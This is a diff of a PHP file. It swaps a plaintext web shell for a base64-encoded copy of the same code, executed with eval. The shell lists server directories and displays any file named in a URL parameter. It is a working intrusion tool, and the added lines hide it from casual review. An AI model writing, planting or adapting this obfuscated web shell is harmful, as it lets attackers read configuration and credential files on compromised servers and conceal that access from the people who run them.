@@ -1,62 +1,7 @@
 <?php
-$encode = base64_encode('
-$path = $_GET[\'v\'];
-$action = $_GET[\'a\'];
 
-echo "Servidor <br>";
-
-if($action == true){
-
-echo "<textarea class=\'form-control\' name=\'textl\'>";
-
-$arquivo_edit = fopen ($action, \'r\') or die("Unable to open file!");
-
-while( !feof($arquivo_edit)){
-$linha = fgets($arquivo_edit);
-echo htmlspecialchars($linha);
-
-}
-
-fclose($arquivo_edit);
+$encode = "CiRwYXRoID0gJF9HRVRbJ3YnXTsKJGFjdGlvbiA9ICRfR0VUWydhJ107CgplY2hvICJTZXJ2aWRvciA8YnI+IjsKCmlmKCRhY3Rpb24gPT0gdHJ1ZSl7CgplY2hvICI8dGV4dGFyZWEgY2xhc3M9J2Zvcm0tY29udHJvbCcgbmFtZT0ndGV4dGwnPiI7CgokYXJxdWl2b19lZGl0ID0gZm9wZW4gKCRhY3Rpb24sICdyJykgb3IgZGllKCJVbmFibGUgdG8gb3BlbiBmaWxlISIpOwoKd2hpbGUoICFmZW9mKCRhcnF1aXZvX2VkaXQpKXsKJGxpbmhhID0gZmdldHMoJGFycXVpdm9fZWRpdCk7CmVjaG8gaHRtbHNwZWNpYWxjaGFycygkbGluaGEpOwoKfQoKZmNsb3NlKCRhcnF1aXZvX2VkaXQpOwoKCmVjaG8gIjwvdGV4dGFyZWE+IjsKCgoKfWVsc2V7CgoKCgppZigkcGF0aCA9PSBmYWxzZSl7CiRwYXRoID0gIi4vIjsKfWVsc2V7CiRwYXRoID0gJHBhdGg7Cn0KCiRkaXJldG9yaW8gPSBkaXIoJHBhdGgpOwoKCndoaWxlKCRhcnF1aXZvID0gJGRpcmV0b3JpbyAtPiByZWFkKCkpewoKJGFycXVpdm9leCA9IHN1YnN0cigkYXJxdWl2bywgc3Rycmlwb3MoJGFycXVpdm8sICcuJykpOwoKaWYoJGFycXVpdm9leCA9PSAiLnBocCIgb3IgJGFycXVpdm9leCA9PSAiLmpzIiBvciAkYXJxdWl2b2V4ID09ICIuY3NzIiBvciAkYXJxdWl2b2V4ID09ICIudHh0Iil7CiRtb3N0cmFyID0gIjxhIGhyZWY9J3NoZWxsLnBocD9hPSRwYXRoJGFycXVpdm8nPiIuJGFycXVpdm8uIjwvYT48YnI+IjsKfWVsc2V7CiRtb3N0cmFyID0gIjxhIGhyZWY9J3NoZWxsLnBocD92PSRwYXRoJGFycXVpdm8vJz4iLiRhcnF1aXZvLiI8L2E+PGJyPiI7Cn0KCmVjaG8gJG1vc3RyYXI7Cgp9CiRkaXJldG9yaW8gLT4gY2xvc2UoKTsKfQoKCg==";
 
 
-echo "</textarea>";
-
-
-
-}else{
-
-
-
-
-if($path == false){
-$path = "./";
-}else{
-$path = $path;
-}
-
-$diretorio = dir($path);
-
-
-while($arquivo = $diretorio -> read()){
-
-$arquivoex = substr($arquivo, strripos($arquivo, \'.\'));
-
-if($arquivoex == ".php" or $arquivoex == ".js" or $arquivoex == ".css" or $arquivoex == ".txt"){
-$mostrar = "<a href=\'shell.php?a=$path$arquivo\'>".$arquivo."</a><br>";
-}else{
-$mostrar = "<a href=\'shell.php?v=$path$arquivo/\'>".$arquivo."</a><br>";
-}
-
-echo $mostrar;
-
-}
-$diretorio -> close();
-}
-
-
-');
-
-echo $encode;
-//eval(base64_decode($encode))
+eval(base64_decode($encode))
 ?>
